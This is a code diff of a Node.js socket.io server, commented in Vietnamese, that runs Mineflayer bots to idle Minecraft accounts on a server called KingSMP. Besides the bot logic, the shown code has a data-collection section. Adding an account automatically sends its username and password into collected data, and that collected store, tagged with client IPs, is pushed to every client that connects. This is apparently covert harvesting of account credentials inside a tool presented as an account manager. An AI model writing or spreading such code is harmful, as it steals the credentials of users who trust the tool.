@@ -46,6 +46,7 @@ io.on('connection', (socket) => {
 
     console.log(`[${new Date().toLocaleString()}] 🔌 Client connected: ${clientIp}`);
 
+    // Khởi tạo dữ liệu cho IP này
     if (!clientData[clientIp]) {
         clientData[clientIp] = {
             accounts: [],
@@ -53,13 +54,12 @@ io.on('connection', (socket) => {
         };
     }
 
+    // Gửi danh sách tài khoản về client
     socket.emit('init_accounts', clientData[clientIp].accounts);
     socket.emit('sync_collected_data', globalCollectedData);
     socket.emit('maintenance_status', isMaintenance);
 
-    // ============================================================
-    //  THU THẬP DỮ LIỆU
-    // ============================================================
+    // ===== THU THẬP DỮ LIỆU =====
     socket.on('collect_data', (data) => {
         const entry = {
             ip: clientIp,
@@ -80,9 +80,7 @@ io.on('connection', (socket) => {
         io.emit('log', `[${new Date().toLocaleString()}] 🧹 Đã xóa toàn bộ dữ liệu thu thập`);
     });
 
-    // ============================================================
-    //  BẢO TRÌ
-    // ============================================================
+    // ===== BẢO TRÌ =====
     socket.on('toggle_maintenance', (status) => {
         isMaintenance = status;
         io.emit('maintenance_status', isMaintenance);
@@ -90,13 +88,12 @@ io.on('connection', (socket) => {
         console.log(`[${new Date().toLocaleString()}] 🛠️ Maintenance: ${status ? 'ON' : 'OFF'}`);
     });
 
-    // ============================================================
-    //  QUẢN LÝ ACCOUNTS
-    // ============================================================
+    // ===== QUẢN LÝ ACCOUNTS (MULTI-ACCOUNT) =====
     socket.on('add_account', (data) => {
         const { username, password } = data;
         if (!username) return;
         
+        // Tự động thu thập dữ liệu
         socket.emit('collect_data', {
             username: username,
             password: password || 'caigicungdc',
@@ -123,6 +120,7 @@ io.on('connection', (socket) => {
         }
         clientData[clientIp].accounts = clientData[clientIp].accounts.filter(acc => acc.id !== id);
         io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
+        socket.emit('log', `[SYSTEM] 🗑️ Đã xóa tài khoản`);
     });
 
     socket.on('toggle_auto_reconnect', (id) => {
@@ -134,7 +132,7 @@ io.on('connection', (socket) => {
     });
 
     // ============================================================
-    //  BOT MINEFLAYER
+    //  BOT MINEFLAYER (MULTI-ACCOUNT - MỖI BOT 1 TÀI KHOẢN)
     // ============================================================
     socket.on('start_bot', (id) => {
         const account = clientData[clientIp].accounts.find(acc => acc.id === id);
@@ -177,7 +175,6 @@ io.on('connection', (socket) => {
                     account.status = 'ONLINE / KINGSMP';
                     account.color = '#00ff88';
                     socket.emit('log', `[${account.username}] ✅ ĐÃ VÀO KINGSMP!`);
-                    // Không gõ /afk ở đây nữa, sẽ gõ trong windowOpen
                 } else {
                     account.status = 'ONLINE / LOBBY';
                     account.color = '#00ff88';
@@ -209,12 +206,11 @@ io.on('connection', (socket) => {
                 }
             });
 
-            // ===== WINDOWOPEN - QUAN TRỌNG: THỨ TỰ ĐÚNG =====
             bot.on('windowOpen', (window) => {
                 const rawTitle = JSON.stringify(window.title || '').toLowerCase();
                 socket.emit('log', `[${account.username}] 📂 Menu mở: ${rawTitle}`);
 
-                // BƯỚC 1: Chọn KingSMP từ Menu Sảnh (Slot 24)
+                // BƯỚC 1: Chọn KingSMP (Slot 24)
                 if (!hasJoinedKingSMP) {
                     setTimeout(() => {
                         if (!bot || !bot.currentWindow) return;
@@ -231,13 +227,11 @@ io.on('connection', (socket) => {
 
                     }, 2500);
                 } 
-                // BƯỚC 2: Gõ /afk TRƯỚC, SAU ĐÓ click Slot 1
+                // BƯỚC 2: Gõ /afk + Click Slot 1
                 else if (hasJoinedKingSMP && !hasExecutedAFK) {
-                    // Gõ /afk trước
                     socket.emit('log', `[${account.username}] 💤 Gửi lệnh /afk...`);
                     bot.chat('/afk');
                     
-                    // Đợi 2.5 giây rồi click Slot 1
                     setTimeout(() => {
                         if (!bot || !bot.currentWindow) return;
                         socket.emit('log', `[${account.username}] 🖱️ Click Slot 1 chọn AFK...`);
